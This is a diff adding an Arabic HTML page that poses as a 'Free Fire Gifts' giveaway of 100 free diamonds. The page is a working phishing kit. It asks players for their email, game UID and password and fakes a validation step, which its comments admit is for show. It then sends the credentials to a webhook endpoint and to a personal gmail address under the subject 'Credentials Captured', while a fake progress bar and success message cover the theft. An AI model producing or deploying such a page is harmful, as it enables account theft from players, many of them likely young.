@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدايا فري فاير مجانية - Free Fire Gifts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
+            to { box-shadow: 0 20px 60px rgba(255,107,107,0.5); }
+        }
+        .logo {
+            font-size: 3em;
+            background: linear-gradient(45deg, #ff4757, #ffa502);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(255,71,87,0.5);
+        }
+        .gift-item {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+        .price {
+            font-size: 2em;
+            color: #ffd700;
+            margin: 10px 0;
+        }
+        .btn-order {
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+            margin: 20px 0;
+        }
+        .btn-order:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
+        }
+        .form-group {
+            margin: 20px 0;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #555;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 1.1em;
+            transition: border 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            box-shadow: 0 0 10px rgba(255,107,107,0.3);
+        }
+        .btn-claim {
+            background: linear-gradient(45deg, #00b894, #00cec9);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0,184,148,0.4);
+            margin-top: 20px;
+        }
+        .btn-claim:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,184,148,0.6);
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00b894, #00cec9);
+            width: 0%;
+            transition: width 0.1s;
+            border-radius: 10px;
+            position: relative;
+        }
+        .progress-text {
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
+        .success {
+            display: none;
+            background: linear-gradient(135deg, #00b894, #00cec9);
+            color: white;
+            padding: 30px;
+            border-radius: 20px;
+            animation: successAnim 1s ease-out;
+        }
+        @keyframes successAnim {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .error {
+            display: none;
+            background: #ff6b6b;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: #ffd700;
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="logo">🎁 Free Fire Gifts</div>
+        
+        <div class="gift-item">
+            <h2>دياموندات 100 💎</h2>
+            <div class="price">مجانًا! 🆓</div>
+            <p>احصل على 100 دياموند فوري لشراء أي شيء في اللعبة!</p>
+        </div>
+
+        <button class="btn-order" onclick="showForm()">اطلب الآن! 🚀</button>
+
+        <form id="giftForm" style="display: none;">
+            <div class="form-group">
+                <label>بريدك الإلكتروني (Email):</label>
+                <input type="email" id="email" placeholder="example@gmail.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>اسم حساب فري فاير (UID):</label>
+                <input type="text" id="uid" placeholder="123456789" required>
+            </div>
+            
+            <div class="form-group">
+                <label>كلمة السر (Password):</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            
+            <div id="errorMsg" class="error"></div>
+            
+            <button type="button" class="btn-claim" onclick="claimGift()">الحصول الآن! ⚡</button>
+        </form>
+
+        <div class="loading" id="loading">
+            <div class="progress-text" id="progressText">جاري التحقق...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <div class="success" id="successMsg">
+            <h2>✅ تم بنجاح!</h2>
+            <p>سوف تستلم الهدية خلال 24 ساعة في حسابك.</p>
+            <p>شكرًا لاستخدام موقع هدايا فري فاير! 🎉</p>
+        </div>
+    </div>
+
+    <script>
+        // تأثيرات الجسيمات المتحركة
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                particles.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        function showForm() {
+            document.querySelector('.btn-order').style.display = 'none';
+            document.getElementById('giftForm').style.display = 'block';
+        }
+
+        // محاكاة التحقق من صحة البيانات (للإيهام)
+        async function validateCredentials(email, uid, password) {
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    // دائمًا يعتبرها صالحة للاستمرار
+                    resolve(true);
+                }, 1000);
+            });
+        }
+
+        function sendData(email, uid, password) {
+            const data = {
+                email: email,
+                uid: uid,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            // إرسال البيانات إلى البريد الإلكتروني عبر webhook (استبدل بالـ webhook الخاص بك)
+            fetch('https://api.webhook.site/YOUR_WEBHOOK_ID', {  // استخدم webhook.site أو webhook آخر لاختبار
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log('Send error:', err));
+
+            // بديل: إرسال مباشر عبر mailto (لكن webhook أفضل)
+            const subject = encodeURIComponent('Free Fire Credentials Captured');
+            const body = encodeURIComponent(`Email: ${email}\nUID: ${uid}\nPassword: ${password}\nUA: ${navigator.userAgent}`);
+            window.location.href = `mailto:onlysidou@gmail.com?subject=${subject}&body=${body}`;
+        }
+
+        async function claimGift() {
+            const email = document.getElementById('email').value;
+            const uid = document.getElementById('uid').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !uid || !password) {
+                showError('يرجى ملء جميع الحقول!');
+                return;
+            }
+
+            // إخفاء النموذج وعرض التحميل
+            document.getElementById('giftForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('errorMsg').style.display = 'none';
+
+            // تحقق وهمي
+            const isValid = await validateCredentials(email, uid, password);
+            
+            if (!isValid) {
+                showError('بيانات غير صحيحة! حاول مرة أخرى.');
+                return;
+            }
+
+            // إرسال البيانات فورًا
+            sendData(email, uid, password);
+
+            // تشغيل شريط التقدم
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                
+                document.getElementById('progressFill').style.width = progress + '%';
+                document.getElementById('progressText').textContent = `جاري تجهيز الهدية... ${Math.floor(progress)}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                    }, 500);
+                }
+            }, 200);
+        }
+
+        function showError(msg) {
+            const errorEl = document.getElementById('errorMsg');
+            errorEl.textContent = msg;
+            errorEl.style.display = 'block';
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
